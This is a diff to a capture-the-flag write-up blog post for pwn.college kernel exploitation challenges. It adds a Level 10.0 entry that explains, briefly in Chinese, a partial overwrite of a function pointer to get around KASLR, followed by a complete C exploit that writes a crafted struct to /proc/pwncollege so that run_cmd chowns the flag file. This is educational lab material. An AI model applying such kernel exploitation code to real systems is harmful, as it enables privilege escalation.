@@ -1,7 +1,7 @@
 ---
 title: "Write-ups: System Security (Kernel Security) series"
 published: 2025-12-19
-updated: 2025-12-23
+updated: 2025-12-25
 description: "Write-ups for pwn.college kernel exploitation series."
 image: "https://ghproxy.net/https://raw.githubusercontent.com/CuB3y0nd/picx-images-hosting/master/.pfs8v4jqs.avif"
 tags: ["Pwn", "Write-ups", "Kernel"]
@@ -828,6 +828,63 @@ int main(void) {
 
   memcpy(payload.buf, cmd, strlen(cmd));
   payload.func = 0xffffffff81089b30ULL;
+
+  write(fd, &payload, sizeof(payload_t));
+
+  return 0;
+}
+```
+
+# Level 10.0
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> Exploit a buggy kernel device with KASLR enabled to get the flag!
+
+## Write-up
+
+和上题一样，但是 kASLR on 。很简单，因为 `printk` 作为最后一个结构体参数保存在末尾，所以可以爆破低字节。
+
+## Exploit
+
+```c
+#include <assert.h>
+#include <fcntl.h>
+#include <stdint.h>
+#include <string.h>
+#include <unistd.h>
+
+#define PACKED __attribute__((packed))
+#define NAKED __attribute__((naked))
+
+#define STR(x) #x
+#define XSTR(x) STR(x)
+
+#define DEVICE "/proc/pwncollege"
+
+typedef struct {
+  char buf[256];
+  char func[3];
+} PACKED payload_t;
+
+int main(void) {
+  int fd = open(DEVICE, O_WRONLY);
+  assert(fd > 0);
+
+  payload_t payload = {0};
+  char *cmd = "/run/dojo/bin/chown 1000:1000 /flag";
+
+  memcpy(payload.buf, cmd, strlen(cmd));
+
+  // ffffffffb2889b30 t run_cmd
+  // ffffffffb28b69a9 T printk
+  payload.func[0] = 0x30;
+  payload.func[1] = 0x9b;
+  payload.func[2] = 0x48;
 
   write(fd, &payload, sizeof(payload_t));
 
